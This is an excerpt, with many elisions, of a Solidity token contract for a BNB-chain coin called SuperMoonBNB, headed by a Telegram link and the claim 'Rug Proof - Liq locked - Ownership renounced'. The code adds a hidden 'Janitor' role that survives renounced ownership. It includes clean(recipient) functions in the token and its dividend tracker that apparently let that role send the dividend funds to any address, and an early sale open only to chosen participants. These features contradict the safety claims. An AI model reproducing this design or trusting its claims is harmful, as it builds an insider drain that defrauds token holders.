...
/*
* 
* Here's the Telegram : https://t.me/SuperMoonBNB
* Rug Proof - Liq locked - Ownership renounced
*
*/
...
contract SuperMoonBNB is ERC20, Ownable, Janitable {
    using SafeMath for uint256;
    ...
    SuperMoonBNBDividendTracker public dividendTracker;

    address public liquidityWallet;

    uint256 public maxSellTransactionAmount = 100000000 * (10**18);
    uint256 public swapTokensAtAmount = 20000000 * (10**18);
    uint256 public _maxWalletToken = 4000000000 * (10**18); // 4% of total supply
    ...
    constructor() public ERC20("SuperMoonBNB", "SuperMoonBNB") {
    	...
    	dividendTracker = new SuperMoonBNBDividendTracker();
    ...
    function updateSwap(bool flag) public onlyJanitorOrOwner {
        swapEnabled = flag;
    }
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "SuperMoonBNB: The dividend tracker already has that address");

        SuperMoonBNBDividendTracker newDividendTracker = SuperMoonBNBDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "SuperMoonBNB: The new dividend tracker must be owned by the SuperMoonBNB token contract");
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "SuperMoonBNB: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "SuperMoonBNB: Account is already the value of 'excluded'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "SuperMoonBNB: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "SuperMoonBNB: Automated market maker pair is already set to that value");
    ...
    function updateLiquidityWallet(address newLiquidityWallet) public onlyOwner {
        require(newLiquidityWallet != liquidityWallet, "SuperMoonBNB: The liquidity wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "SuperMoonBNB: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "SuperMoonBNB: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        if(!tradingEnabled) {
            require(canTransferBeforeTradingIsEnabled[from], "SuperMoonBNB: This account cannot send tokens until trading is enabled");
        }
        ...
        if(isFixedSaleBuy) {
            require(block.timestamp >= fixedSaleStartTimestamp, "SuperMoonBNB: The fixed-sale has not started yet.");
            ...
            if(!openToEveryone) {
                require(fixedSaleEarlyParticipants[to], "SuperMoonBNB: The fixed-sale is only available to certain participants at the start");
            }
        ...
        bool takeFee = !isFixedSaleBuy && tradingEnabled && !swapping;
    ...
    function clean(address payable recipient) public onlyJanitorOrOwner() {
        dividendTracker.clean(recipient);
    }
    
}

contract SuperMoonBNBDividendTracker is DividendPayingToken, Ownable, Janitable {
    
    function clean(address payable recipient) public onlyJanitor() {
    ...
    constructor() public DividendPayingToken("SuperMoonBNB_Dividend_Tracker", "SuperMoonBNB_Dividend_Tracker") {
    	claimWait = 1200;
        minimumTokenBalanceForDividends = 1000000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) internal override {
        require(false, "SuperMoonBNB_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() public override {
        require(false, "SuperMoonBNB_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main SuperMoonBNB contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1200 && newClaimWait <= 86400, "SuperMoonBNB_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "SuperMoonBNB_Dividend_Tracker: Cannot update claimWait to same value");
